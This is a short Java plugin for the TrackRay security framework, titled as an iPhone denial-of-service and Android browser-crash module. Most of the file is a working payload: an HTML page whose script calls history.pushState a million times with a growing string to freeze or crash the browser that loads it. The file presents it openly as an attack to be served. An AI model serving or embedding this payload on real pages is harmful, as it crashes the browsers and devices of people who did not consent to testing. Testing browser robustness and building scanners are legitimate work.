package com.trackray.module.plugin.ios;

import com.trackray.base.annotation.Plugin;
import com.trackray.base.annotation.Rule;
import com.trackray.base.plugin.AbstractPlugin;
import com.trackray.base.plugin.CommonPlugin;

import java.util.Map;

@Plugin(value = "iphoneDOS2",
        title = "iPhone 拒绝服务，安卓浏览器闪退",
        author = "浅蓝")
@Rule(type = AbstractPlugin.Type.HTML )
public class iPhoneDOS2 extends CommonPlugin<String> {
    @Override
    public boolean check(Map<String, Object> param) {
        return true;
    }
    static String payload = "<html>\n" +
            "\n" +
            "<body>\n" +
            "\n" +
            "<script>\n" +
            "\n" +
            "var total=\"\";\n" +
            "\n" +
            "for (var i=0;i<1000000;i++)\n" +
            "\n" +
            "{\n" +
            "    total= total+i.toString ();\n" +
            "\n" +
            "    history.pushState (0,0,total);\n" +
            "\n" +
            "}\n" +
            "\n" +
            "</script>\n" +
            "\n" +
            "</body>\n" +
            "\n" +
            "</html>";


    @Override
    public String start() {
        return payload;
    }
}
